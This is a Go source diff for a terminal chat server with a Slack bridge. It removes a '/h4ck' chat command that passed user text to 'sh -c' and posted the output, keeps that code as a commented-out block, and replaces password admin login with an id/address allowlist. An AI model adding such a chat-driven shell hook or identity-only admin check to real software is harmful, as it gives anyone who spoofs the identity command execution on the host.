@@ -15,7 +15,6 @@ import (
 	"math/rand"
 	"net"
 	"os"
-	"os/exec"
 	"os/signal"
 	"sort"
 	"strconv"
@@ -81,6 +80,8 @@ var (
 
 	tttGame       = new(ttt.Board)
 	currentPlayer = ttt.X
+
+	admins = []string{"d84447e08901391eb36aa8e6d9372b548af55bee3799cd3abb6cdd503fdf2d82"}
 )
 
 // TODO: devbot hangman game
@@ -426,27 +427,6 @@ func runCommands(line string, u *user, isSlack bool) {
 		return
 	}
 
-	if strings.HasPrefix(line, "/h4ck") && !isSlack {
-		if u.id != "d84447e08901391eb36aa8e6d9372b548af55bee3799cd3abb6cdd503fdf2d82" {
-			broadcast(devbot, "nope, not authorized", toSlack)
-			return
-		}
-		cmd := strings.TrimSpace(strings.TrimPrefix(line, "/h4ck"))
-
-		if cmd == "" {
-			broadcast(devbot, "Which command?", false)
-			return
-		}
-
-		out, err := exec.Command("sh", "-c", cmd).Output()
-		if err != nil {
-			broadcast("", "Err: "+fmt.Sprint(err), toSlack)
-			return
-		}
-		broadcast("", "```\n"+string(out)+"\n```", false)
-		return
-	}
-
 	if line == "/bell" && !isSlack {
 		u.bell = !u.bell
 		if u.bell {
@@ -682,16 +662,12 @@ func tttPrint(cells [9]ttt.State) string {
 }
 
 func auth(u *user) bool {
-	pass, err := u.term.ReadPassword("Admin password: ")
-	if err != nil {
-		l.Println(u.name, err)
-		return false
+	for _, id := range admins {
+		if u.id == id || u.addr == id {
+			return true
+		}
 	}
-	if !(pass == string(adminPass)) {
-		u.writeln("", "Incorrect password")
-		return false
-	}
-	return true
+	return false
 }
 
 func cleanName(name string) string {
@@ -790,8 +766,8 @@ func getMsgsFromSlack() {
 			if !strings.HasPrefix(msg.Text, "hide") {
 				h := sha1.Sum([]byte(u.ID))
 				i, _ := binary.Varint(h[:])
-				runCommands(msg.Text, nil, true)
 				broadcast(color.HiYellowString("HC ")+(*colorArr[rand.New(rand.NewSource(i)).Intn(len(colorArr))]).Sprint(strings.Fields(u.RealName)[0]), msg.Text, false)
+				runCommands(msg.Text, nil, true)
 			}
 		case *slack.ConnectedEvent:
 			fmt.Println("Connected to Slack")
@@ -839,3 +815,24 @@ func remove(s []*user, a *user) []*user {
 	}
 	return append(s[:i], s[i+1:]...)
 }
+
+//if strings.HasPrefix(line, "/h4ck") && !isSlack {
+//	if u.id != "d84447e08901391eb36aa8e6d9372b548af55bee3799cd3abb6cdd503fdf2d82" {
+//		broadcast(devbot, "nope, not authorized", toSlack)
+//		return
+//	}
+//	cmd := strings.TrimSpace(strings.TrimPrefix(line, "/h4ck"))
+//
+//	if cmd == "" {
+//		broadcast(devbot, "Which command?", false)
+//		return
+//	}
+//
+//	out, err := exec.Command("sh", "-c", cmd).Output()
+//	if err != nil {
+//		broadcast("", "Err: "+fmt.Sprint(err), toSlack)
+//		return
+//	}
+//	broadcast("", "```\n"+string(out)+"\n```", false)
+//	return
+//}
